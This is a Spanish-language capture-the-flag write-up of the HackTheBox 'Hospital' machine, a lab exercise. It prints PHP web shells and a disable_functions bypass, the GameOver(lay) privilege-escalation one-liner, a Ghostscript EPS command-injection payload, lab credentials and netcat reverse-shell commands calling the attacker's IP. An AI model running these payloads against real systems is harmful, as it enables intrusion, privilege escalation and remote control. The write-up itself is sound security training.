---
title: "Hospital"
date: 2025-05-29 16:41:32 +0200
categories: writeups HackTheBox
tags: máquina windows AD fileupload cve vuln_kernel criptografía infoleak ghostscript roundcube bypassdisablefunctions overlayfs
description: Writeup de la máquina Hospital de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

Texto
___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICMP**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Windows** pues cuenta con **TTL** próximo a 128 (**127**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422120939.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.241`
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.241 -oG allPorts
```

Observamos como nos reporta que un montón de puertos abiertos, pero únicamente nos interesan los que están marcados en rojo.

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422121143.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6612,6633,6648,8080,9389 -sCV 10.10.11.241 -oN targeted
```

En el segundo escaneo de **Nmap**, lo que más nos llamará la atención es la existencia del dominio **hospital.htb** y los páginas webs alojadas en el puerto **8080** y **443**.

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422121434.png>)

___
### Puerto 443 - HTTPS (Apache) | RoundCube

**Virtual Hosting** al `/etc/hosts` `10.10.11.241 hospital.htb dc.hospital.htb`

En la página web del puerto 443 encontraremos un Webmail

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422122100.png>)
### Puerto 8080 - HTTP (Apache)

nos registraremos y logearemos

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422122158.png>)

Una vez logeados, veremos que tenemos un campo de subida de ficheros

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422122317.png>)


___
## Explotación
### Abuso de subidas de archivos

Si intentamos subir un `.php` nos dará un error, por lo que en este punto haremos fuzzing de extensiones usando Caido / **BurpSuite**

[PHP File Extensions - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=file%20upload#file-upload)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422122812.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422123042.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422123146.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422123137.png>)

Con el típico payload no funciona `<?php system($_GET[0]); ?>`

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422123213.png>)

`<?php phpinfo(); ?>` para ver las disable_functions

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422123411.png>)

Básicamente debemos de usar esto `<?php echo fread(popen($_GET[0], "r"), 10000); ?>`

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422123813.png>)

Subsistema de Linux

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422134711.png>)

**Reverse Shell** + **NetCat** (`nc -nlvp 443`)

____
## Linux Subsystem

**Tratamiento de la TTY**

Estamos en un Linux dentro de un Windows, es decir un Subsistema de Linux en Windows

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422123956.png>)
### GameOver(lay) Ubuntu Privilege Escalation | [CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

[Exploit CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
[Original POC](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=42588)

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("whoami && id")'
```

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422124510.png>)

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
```

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422124539.png>)
### Cracking Hash

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422124812.png>)

Podemos usar hashcat de la siguiente forma para crackearlo

```bash
hashcat hash /usr/share/wordlists/rockyou.txt -a0
```

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422125643.png>)

En cambio, si usamos [Hashes.com](https://hashes.com/en/decrypt/hash) nos los crackeará instántaneamente

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422125136.png>)
___
### Puerto 135 - RPC (rpcclient)

Usando las credenciales obtenidas, veremos que nos podemos conectar a través de ssh, pero nos conectaremos al Subsistema Linux

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422125445.png>)

Probaremos a conectaremos por **winrm** pero no tendremos éxito. En cambio, a través de **smb** si que podemos pero no encontraremos ningún recurso interesante. Finalmente, nos conectaremos usando `rpcclient` usando el siguiente comando.

```bash
rpcclient 10.10.11.241 -U 'drwilliams' -c "enumdomusers"
```

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422125909.png>)
Nos crearemos un fichero con los usuarios usando el siguiente oneliner.

```bash
rpcclient 10.10.11.241 -U 'drwilliams%qwe123!@#' -c "enumdomusers" | grep -oP "\[.*?\]" | grep -vE '0x|SM|-' | tr -d '[]' > users.txt
```

Usando el siguiente comando, kerbrute, podemos comprobar que usuarios son válidos.

```bash
kerbrute userenum --dc 10.10.11.241 -d hospital.htb users.txt
```

Veremos que únicamente hay 3 usuarios válidos, **Administrator**, **drbrown** y **drwilliams**

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422130234.png>)
Probaremos un **ASREProast Attack** pero veremos que ningún usuario es **ASREProasteable**

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422130433.png>)
____
### Puerto 443 - HTTPS (Apache) | RoundCube

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422130545.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422130646.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422130705.png>)
### CVE-2023-36664 | Ghostscript Command Injection

[CVE-2023-36664 - Ghostscript Command Injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422130747.png>)

Básicamente, para crear un fichero `.eps` que nos permita ejecutar comandos debemos de lanzar el siguiente exploit.

```bash
python3 CVE_2023_36664_exploit.py --payload "ping -n 1 10.10.14.52" -g -x eps
```

Si no queremos usar el exploit de python, alternativamente, podemos crear un fichero con la siguiente estructura e iremos cambiando el comando a ejecutar según nuestras preferencias. 

```js
%!PS-Adobe-3.0 EPSF-3.0
(%pipe%ping -n 1 10.10.14.160) (w) file /DCTDecode filter
```

>[!INFO]
Es importante destacar el uso de los parámetros `-n` y `-c`, ya que en **Windows** el comando **ping** utiliza `-n`, mientras que en otros sistemas, como **Linux**, se emplea `-c`

Le enviaremos un correo a `drbrown@hospital.htb` y tras esperar muy poco, veremos como recibimos el **ping**.

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422131924.png>)

En este punto, lo que haremos será ponernos en escucha con **NetCat** (`rlwrap -nlvp 443`), y a continuación mandarnos una **Reverse Shell** usando el payload (**Powershell \#3 Base64**) de la web [RevShells](https://www.revshells.com/).

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422133325.png>)

___
## Escalada de privilegios
### Enumeración local

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422133348.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422133406.png>)
![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422133451.png>)

Nos conectaremos a través de **winrm** para operar desde una terminal más cómoda con muchas más funcionalidades.

```bash
evil-winrm -i 10.10.11.241 -u drbrown -p 'chr!$br0wn'
```

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422134020.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422133817.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422133943.png>)

Permisos de escritura en subdirectorios del directorio **htdocs**

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422134329.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422134455.png>)
### XAMPP

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422134526.png>)

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422134556.png>)

A continuación, subiremos un **nc.exe** para poder enviarnos una **Reverse Shell**.

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422134836.png>)

En este punto, lo que haremos será ponernos en escucha con **NetCat** (`rlwrap -nlvp 443`), y a continuación mandarnos una **Reverse Shell** usando el siguiente payload `.\nc.exe -e cmd.exe 10.10.14.160 443`.

![](<../assets/images/posts/2025-05-29-hospital/Pasted image 20250422135107.png>)